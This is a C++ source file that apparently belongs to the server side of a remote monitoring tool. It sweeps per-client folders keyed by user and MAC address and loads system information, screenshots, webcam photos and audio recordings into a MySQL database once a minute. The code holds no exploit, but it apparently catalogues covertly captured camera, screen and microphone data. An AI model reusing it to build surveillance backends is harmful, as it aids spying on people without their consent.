
#include "recommit.h"
#include "FileHelper.h"
#include "main.h"
#include "mysqlOper.h"
#include "FileReadLine.h"
#include "Public.h"

using namespace std;


void commitdata(string path, string user, string mac) {

	WIN32_FIND_DATAA f = { 0 };
	string fn = path + "*.*";

	HANDLE h = FindFirstFileA(fn.c_str(), &f);
	if (h == INVALID_HANDLE_VALUE)
	{
		return;
	}

	int ret = 0;
	while (1)
	{
		if ((f.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE))
		{
			string filename = path + f.cFileName;

			if (strstr(f.cFileName, SYSTEMINFOFILENAME))
			{
				char* lpdata = 0;
				int fs = 0;
				ret = FileHelper::fileReader(filename.c_str(), &lpdata, &fs);
				if (ret > 0)
				{
#ifdef USE_MYSQL
					MySql::enterLock();
					MySql* mysql = new MySql();

					string info = string(lpdata, fs);
					delete lpdata;

					char* result = 0;
					ret = GBKToUTF8(info.c_str(), &result);
					ret = mysql->insertClient(user, mac, result);
					delete result;

					delete mysql;
					MySql::leaveLock();
#endif
				}

			}
			else if (strstr(f.cFileName, "app_screen_"))
			{
#ifdef USE_MYSQL
				MySql::enterLock();
				MySql* mysql = new MySql();

				ret = mysql->insertPhoto(mac, "2", filename);
				delete mysql;
				MySql::leaveLock();
#endif
			}
			else if (strstr(f.cFileName, "screen_"))
			{
#ifdef USE_MYSQL
				MySql::enterLock();
				MySql* mysql = new MySql();

				ret = mysql->insertPhoto(mac, "3", filename);
				delete mysql;
				MySql::leaveLock();
#endif
			}
			else if (strstr(f.cFileName, "canmeraphoto_"))
			{
#ifdef USE_MYSQL
				MySql::enterLock();
				MySql* mysql = new MySql();

				ret = mysql->insertPhoto(mac, "1", filename);
				delete mysql;
				MySql::leaveLock();
#endif
			}
			else if (strstr(f.cFileName, "sound_"))
			{
#ifdef USE_MYSQL
				MySql::enterLock();
				MySql* mysql = new MySql();

				ret = mysql->insertAudio(mac, filename, f.nFileSizeLow);
				delete mysql;
				MySql::leaveLock();
#endif
			}
		}
		else if (f.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			if (lstrcmpiA(f.cFileName, ".") == 0 || lstrcmpiA(f.cFileName, "..") == 0)
			{

			}
			else {
				string nextpath = path + f.cFileName + "\\";
				commitdata(nextpath, user, mac);
			}
		}


		ret = FindNextFileA(h, &f);
		if (ret <= 0)
		{
			break;
		}
	}

	FindClose(h);
}

int __stdcall Recommit::recommit() {

	while (1)
	{


		char* data = 0;
		int fs = 0;
		int ret = 0;

		ret = FileHelper::fileReader("recommit.config", &data, &fs);
		if (ret)
		{
			vector <string> userpath;

			string sub = data;
			while (1)
			{
				int p = sub.find("\r\n");
				if (p != -1)
				{
					string user = sub.substr(0, p);
					userpath.push_back(user);
					sub = sub.substr(p + 2);
				}
				else {
					userpath.push_back(sub);
					sub = "";
					break;
				}
			}

			for (int i = 0; i < userpath.size(); i++)
			{
				char* pos = strchr((char*)userpath[i].c_str(), '\\');
				if (pos <= 0)
				{
					pos = strchr((char*)userpath[i].c_str(), '/');
				}

				if (pos > 0)
				{
					*pos = 0;
					pos++;

					char szuser[256] = { 0 };
					char szmac[256] = { 0 };

					lstrcpyA(szuser, (char*)userpath[i].c_str());
					lstrcpyA(szmac, pos);


					char szpath[MAX_PATH] = { 0 };
					GetCurrentDirectoryA(MAX_PATH, szpath);

					pos--;
					*pos = '\\';

					string path = string(szpath) + "\\" + string((char*)userpath[i].c_str()) + "\\";

					commitdata(path, szuser, szmac);

					char szout[1024];
					wsprintfA(szout, "recommit path:%s,user:%s,mac:%s\r\n", path.c_str(), szuser, szmac);
					WriteLog(szout);

				}
			}

		}

		if (data)
		{
			delete data;
		}

		Sleep(60000);
	}

}